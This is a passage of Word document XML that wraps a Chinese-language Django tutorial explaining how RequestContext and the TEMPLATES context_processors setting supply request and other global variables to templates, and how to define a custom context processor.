        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    context['title'] = '测试标题'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224782AF" w14:textId="282C4880" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    return render(request, 'index.html', context)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6D4459" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上面是某个views.py的方法之一。它将渲染index.html模版(Template)页面，并返回context字典。该字典是传入变量信息给前端页面。对应的index.html如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E3DCD3" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9B8A55" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;head&gt;&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5016A623" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF05C97" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    &lt;h3&gt;{{title}}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131CD876" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    &lt;p&gt;是否登录：{{request.user.is_authenticated}}&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A8E4E8" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="540B468D" w14:textId="6F263781" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA45751" w14:textId="3FBDCB1F" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>响应结果除了有title变量值之外，还有是否登录信息。该登录信息来自request变量，问题是上面views.py中返回结果的context中没有写入request变量。而模版也没却有可以获取该变量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02765107" w14:textId="7D0EE6EB" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这个当时不是无中生有，我一步一步剖析给大家看。原理讲明白之后，就自然懂得如何设置模版(Templates)的全局变量或者叫默认变量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100F2B86" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>render方法是render_to_response方法的简写方式。上面的views.py代码相当于如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31056D14" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#coding:utf-8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383667FD" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render_to_response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD53BD6" w14:textId="02B1E0EF" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.template import RequestContext</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6542C2" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BEC0ED" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    context = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFC23A2" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>    context['title'] = '测试标题'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED9AE01" w14:textId="4368A05F" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    return render_to_response('index.html', context, RequestContext(request))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF520B2" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果去掉render_to_response的第三个参数，即RequestContext(request)部分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F43FAF" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>渲染index.html模版页面就无法得到{{request.user.is_authenticated}}的值，即没有传递request变量给前端页面。很明显RequestContext很关键。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A3BC914" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>有关RequestContext的内容可以从Django官方文档查得。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629E006C" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>该类实例化时会解析settings中的Templates设置中的context_processors配置。新建Django项目settings.py文件中默认的Templates设置如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62830853" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>TEMPLATES = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E330DE"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41D690E3" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'BACKEND': 'django.template.backends.django.DjangoTemplates',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F811EF1" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'DIRS': [],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778CF284" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'APP_DIRS': True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7540B287" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>        'OPTIONS': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0DD98E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>            'context_processors': [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046007D0" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.template.context_processors.debug',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73186743" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.template.context_processors.request',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3E7818" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.contrib.auth.context_processors.auth',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1991E2D9" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>                'django.contrib.messages.context_processors.messages',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB8662B"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1934301A"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02261CEE"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61CC3AFA" w14:textId="118F597C" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FF8557" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大家可发现context_processors有一系列设置，其中根据django.template.context_processors.request的路径找到Django的相关源码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FAB472D" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django安装在Python的安装目录下Lib/site-packages/目录中，找到django/template/context_processors.py文件，打开可看到request方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D66AD4" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def request(request):    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E410E68" w14:textId="1F4E152E" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>    return {'request': request}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B596886" w14:textId="17B53F67" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>该方法返回一个字典，key为request，value为request对象。很明显，render中的request对象就是通过加载settings中的context_processors列表方法得到字典项。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="200BB0E7" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们也可以采用这种方法，给Django项目设置全局的模版变量。例如，我的Django名称为myproject，在myproject/myproject目录中创建一个contexts.py文件，代码如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8E5330" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#coding:utf-8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707BB33E" w14:textId="4ACC390B" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.conf import settings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549842AA" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># 得到语言设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70425862" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>def lang(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EFFF68" w14:textId="38419509" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
